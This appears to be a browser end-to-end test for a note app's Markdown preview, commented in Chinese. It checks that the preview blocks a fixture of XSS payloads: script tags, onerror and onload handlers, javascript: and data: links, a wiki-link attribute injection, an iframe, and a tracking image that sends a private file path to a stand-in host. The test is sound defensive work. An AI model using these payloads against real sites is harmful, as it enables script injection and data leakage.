// 验收 ED-06（LiteSync 网页部分）：恶意 Markdown / HTML / 脚本 URL / SVG / 远程追踪图片在预览中
// 不执行任何脚本、不向第三方发出请求；合法代码块只当文本显示。本机隔离服务端，合成数据。
import { E2E, Suite } from "../lib/harness";
import { createNote, createVault, tokenLogin } from "../lib/ui";

const PASSWORD = "ED06 仓库密码 · 2026-11-21";
const EVIL = [
	"# 恶意夹具",
	"<script>window.__pwned = 'script'</script>",
	"<img src=x onerror=\"window.__pwned='onerror'\">",
	"<svg onload=\"window.__pwned='svg'\"><circle r=5></circle></svg>",
	"[点我](javascript:window.__pwned='jslink')",
	"[数据链接](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
	"![追踪像素](https://tracker.example.invalid/pixel.png?path=私密/路径.md)",
	"<iframe src=\"https://evil.example.invalid/\"></iframe>",
	"[[evil\" onmouseover=\"window.__pwned='wiki']]",
	"```html",
	"<script>window.__pwned = 'codeblock'</script>",
	"```",
	"",
].join("\n");

/* eslint-disable @typescript-eslint/no-explicit-any */
await new Suite().run(async (s) => {
	const browser = await s.launch(); // close() 由套件骨架在收集完证据后执行
	try {
		const ctx = await s.context(browser, { viewport: { width: 1280, height: 860 } });
		const page = await ctx.newPage();
		s.attach(page);
		const external: string[] = [];
		page.on("request", (req: any) => {
			const u = new URL(req.url());
			if (u.origin !== new URL(E2E.base).origin && !u.protocol.startsWith("blob") && !u.protocol.startsWith("data")) external.push(req.url());
		});
		const cspViolations: string[] = [];
		page.on("console", (m: any) => /Content Security Policy|Refused to/.test(m.text()) && cspViolations.push(m.text()));
		page.on("dialog", (d: any) => d.accept(d.type() === "prompt" ? "ED06/恶意夹具.md" : undefined));
		await tokenLogin(page);
		await createVault(page, "ED06-" + Date.now().toString(36), PASSWORD);
		await createNote(page, "ED06/恶意夹具.md");
		await page.locator(".cm-content").click();
		await page.keyboard.insertText(EVIL);
		await page.keyboard.press("Control+s");
		await page.locator('.save-status[data-state="synced"]').waitFor({ timeout: 20000 });
		// 分栏预览 + 重新打开后的阅读模式各看一次
		await page.locator('.seg button[data-mode="split"]').click();
		await page.waitForTimeout(800);
		await page.evaluate(() => (location.hash = "#/n/" + encodeURIComponent("ED06/恶意夹具.md")));
		await page.locator(".preview-pane").first().waitFor({ timeout: 15000 });
		await page.waitForTimeout(1500);
		const jsLink = page.getByText("点我").first();
		if (await jsLink.count()) await jsLink.click({ force: true }).catch(() => undefined);
		await page.waitForTimeout(500);
		await page.screenshot({ path: `${E2E.out}/ed06-preview.png`, fullPage: true });

		const pwned = await page.evaluate(() => (window as any).__pwned ?? null);
		s.check("预览中没有任何脚本被执行（script / onerror / svg onload / javascript: / Wiki 注入 / 代码块）", pwned === null, String(pwned));
		const dangerous = await page.evaluate(() => ({
			scripts: document.querySelectorAll(".preview-pane script, .markdown-body script").length,
			handlers: Array.from(document.querySelectorAll(".preview-pane *, .markdown-body *")).filter((n) => Array.from(n.attributes).some((a) => a.name.startsWith("on"))).length,
			jsHrefs: document.querySelectorAll('a[href^="javascript:"], a[href^="data:"]').length,
			iframes: document.querySelectorAll(".preview-pane iframe, .markdown-body iframe").length,
		}));
		s.check("渲染结果里没有 script、事件属性、javascript:/data: 链接或 iframe", dangerous.scripts === 0 && dangerous.handlers === 0 && dangerous.jsHrefs === 0 && dangerous.iframes === 0, JSON.stringify(dangerous));
		s.check("预览没有向任何第三方发出请求（远程追踪图片被拦下，敏感路径不外泄）", external.length === 0, external.join(" | "));
		const codeShown = await page.evaluate(() => Array.from(document.querySelectorAll(".preview-pane code, .markdown-body code")).some((c) => (c.textContent ?? "").includes("window.__pwned = 'codeblock'")));
		s.check("代码块里的脚本只当文本显示", codeShown);
		s.check("CSP 拦截记录（远程图片被 img-src 拦下属于预期）", true, `${cspViolations.length} 条`);
		await ctx.close();
	} finally {
		await browser.close();
	}
});
